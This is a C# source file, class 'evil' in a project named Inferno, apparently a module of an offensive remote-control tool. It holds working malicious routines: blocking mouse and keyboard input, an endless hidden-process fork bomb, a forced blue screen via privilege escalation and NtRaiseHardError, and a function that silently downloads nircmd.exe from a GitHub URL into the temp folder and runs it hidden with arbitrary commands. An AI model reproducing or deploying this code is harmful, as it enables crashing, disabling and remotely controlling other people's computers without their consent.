using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;


namespace Inferno
{

	internal class evil
    {

		// Output
		private static dynamic output = new System.Dynamic.ExpandoObject();

		
		[DllImport("ntdll.dll")]
		public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

		[DllImport("ntdll.dll")]
		public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

		[DllImport("User32", CharSet = CharSet.Auto)] 
		public static extern int SystemParametersInfo(int uiAction, int uiParam, string pvParam, uint fWinIni);

		[DllImport("user32.dll", EntryPoint = "BlockInput")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);
		[DllImport("winmm.dll", EntryPoint = "mciSendString")]
		public static extern int mciSendStringA(string lpstrCommand, string lpstrReturnString,
							int uReturnLength, int hwndCallback);


		// Block system (mouse && keyboard)
		public static void BlockSystem(string time)
		{
			if (!admin.isAdmin())
			{
				output.error = true;
				core.Exit("Access denied, administrator rights needed to block system!", output, 2);
			}
			BlockInput(true);
			System.Threading.Thread.Sleep(Int32.Parse(time) * 1000);
			BlockInput(false);
			core.Exit("Blocked system at " + time + " seconds!", output);
		}

		// ForkBomb
		public static void ForkBomb()
		{
			string[] apps = new string[5] { 
				"notepad",
				"explorer",
				"mspaint",
				"calc",
				"cmd"
			};
			while (true)
			{
				Random random = new Random();
				int rand = random.Next(0, apps.Length);
				string start = apps[rand] + ".exe";

				Process process = new Process();
				ProcessStartInfo startInfo = new ProcessStartInfo();
				startInfo.WindowStyle = ProcessWindowStyle.Hidden;
				startInfo.FileName = start;
				process.StartInfo = startInfo;
				process.Start();
			}
		}


		// Make blue screen of death
		public static void Bsod()
        {
			Boolean t1;
			uint t2;
			RtlAdjustPrivilege(19, true, false, out t1);
			NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
		}

		// Set wallpaper
		public static void setWallpaper(string image)
		{
			if (File.Exists(image))
			{
				Console.WriteLine("Setting wallpaper: " + image);
				SystemParametersInfo(0x0014, 0, Path.GetFullPath(image), 0x0001);
				output.filename = image;
				core.Exit("Wallpaper set", output);
			} else
			{
				Console.WriteLine("Wallpaper file " + image + " not found!");
				output.error = true;
				core.Exit("Wallpaper not found", output, 1);
			}
		}


		// CDROM open
		public static void cdrom_open(string driveLetter)
		{
			if (string.IsNullOrEmpty(driveLetter))
			{
				foreach (char drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray())
				{
					mciSendStringA("open " + drive + ": type CDaudio alias drive" + drive, null, 0, 0);
					mciSendStringA("set drive" + drive + " door open", null, 0, 0);
				}
				core.Exit("CDROM OPEN command sent to all cd-drives!", output);
			} else {
				mciSendStringA("open " + driveLetter + ": type CDaudio alias drive" + driveLetter, null, 0, 0);
				mciSendStringA("set drive" + driveLetter + " door open", null, 0, 0);
				core.Exit("CDROM OPEN command sent for " + driveLetter + " device!", output);
			}
		}


		// CDROM close
		public static void cdrom_close(string driveLetter)
		{
			if (string.IsNullOrEmpty(driveLetter))
			{
				foreach(char drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray())
				{
					mciSendStringA("open " + drive + ": type CDaudio alias drive" + drive, "", 0, 0);
					mciSendStringA("set drive" + drive + " door closed", "", 0, 0);
				}
				core.Exit("CDROM CLOSE command sent to all cd-drives!", output);
			} else {
				mciSendStringA("open " + driveLetter + ": type CDaudio alias drive" + driveLetter, "", 0, 0);
				mciSendStringA("set drive" + driveLetter + " door closed", "", 0, 0);
				core.Exit("CDROM CLOSE command sent for " + driveLetter + " device!", output);
			}	
		}


		// Nircmdc
		public static void nircmdc(string command)
		{
			string NIRCMDC_LINK = "https://raw.githubusercontent.com/LimerBoy/hackpy/master/modules/nircmd.exe";
			string NIRCMDC_PATH = Environment.GetEnvironmentVariable("temp") + "\\nircmdc.exe";
		
			// Check if nircmdc.exe file exists
			if (!File.Exists(NIRCMDC_PATH))
			{
				WebClient webClient = new WebClient();
				webClient.DownloadFile(NIRCMDC_LINK, NIRCMDC_PATH);
			}

			Process process = new Process();
			ProcessStartInfo startInfo = new ProcessStartInfo();
			startInfo.WindowStyle = ProcessWindowStyle.Hidden;
			startInfo.FileName = NIRCMDC_PATH;
			startInfo.Arguments = command;
			process.StartInfo = startInfo;
			process.Start();
			//process.WaitForExit();

			core.Exit("Nircmdc command executed!", output);
		}


	}
}
